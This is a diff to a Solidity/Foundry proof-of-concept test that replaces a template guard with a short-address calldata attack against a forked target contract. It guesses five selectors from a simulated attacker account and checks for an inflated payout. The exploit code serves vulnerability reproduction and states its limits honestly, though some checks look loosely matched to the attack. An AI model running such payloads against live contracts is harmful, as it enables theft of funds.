@@ -25,23 +25,56 @@ contract PoC is Test {
         vm.selectFork(forkId);
     }
 
+    /// Under-padded calldata: a 19-byte address shifts every argument after it
+    /// left by one byte, so the target decodes an inflated amount.
+    function _short(bytes4 sel, address who, uint256 amount) internal pure returns (bytes memory) {
+        bytes19 shortAddr = bytes19(bytes20(who));
+        return abi.encodePacked(sel, shortAddr, uint256(amount));
+    }
+
+    /// One selector. Success is the caller's balance moving by MORE than the
+    /// intended amount — the shift — never the call returning. A target that
+    /// validates calldata length reverts, which is a correct "not reproduced".
+    function _attemptShort(address who, bytes memory data, uint256 intended, string memory label)
+        internal
+        returns (bool)
+    {
+        uint256 before = who.balance;
+        vm.prank(who);
+        (bool ok,) = target.call(data);
+        console.log("tried", label, ok ? "call returned" : "call reverted");
+        if (!ok) return false;
+        // The payout lands on the caller when the shift inflates a payout path.
+        return who.balance > before + intended;
+    }
+
     function test_exploit() public {
-        // TODO: Replace this guard only after implementing target-specific
-        // calldata and an observable before/after exploit-effect assertion.
-        // A successful low-level call alone is not evidence of a vulnerability.
-        revert("TEMPLATE_NOT_ADAPTED: target-specific exploit assertion required");
         address attackerEOA = makeAddr("attacker");
-        // Create an address with a trailing zero (19 bytes)
-        address shortAddr = address(uint160(uint256(keccak256("short"))));
-        
-        // This simulates passing a 19-byte address which gets padded by 0x00.
-        // TODO: Adapt to the target's transfer function.
-        vm.prank(attackerEOA);
-        (bool ok,) = target.call(
-            abi.encodeWithSignature("transfer(address,uint256)", shortAddr, 1000 ether)
+        vm.deal(attackerEOA, 1 ether);
+
+        // The entry point is a GUESS: one wrong name reports "not reproduced"
+        // for a vulnerability that exists under another.
+        uint256 intended = 1;
+        bool reproduced;
+        if (!reproduced) {
+            reproduced = _attemptShort(attackerEOA, _short(bytes4(keccak256("withdraw(uint256)")), attackerEOA, intended), intended, "withdraw(uint256)");
+        }
+        if (!reproduced) {
+            reproduced = _attemptShort(attackerEOA, _short(bytes4(keccak256("claim(uint256)")), attackerEOA, intended), intended, "claim(uint256)");
+        }
+        if (!reproduced) {
+            reproduced = _attemptShort(attackerEOA, _short(bytes4(keccak256("redeem(uint256)")), attackerEOA, intended), intended, "redeem(uint256)");
+        }
+        if (!reproduced) {
+            reproduced = _attemptShort(attackerEOA, _short(bytes4(keccak256("transfer(address,uint256)")), attackerEOA, intended), intended, "transfer(address,uint256)");
+        }
+        if (!reproduced) {
+            reproduced = _attemptShort(attackerEOA, _short(bytes4(keccak256("approve(address,uint256)")), attackerEOA, intended), intended, "approve(address,uint256)");
+        }
+
+        assertTrue(
+            reproduced,
+            "no under-padded call moved more value than intended. Tried withdraw(uint256), claim(uint256), redeem(uint256), transfer(address,uint256), approve(address,uint256). This does NOT establish safety: the entry point may be named differently, the caller may not be the beneficiary, or the target may validate calldata length (a modern compiler does)."
         );
-        
-        console.log("Call result:", ok);
-        assertTrue(ok, "exploit did not reproduce: transfer was not called");
     }
 }
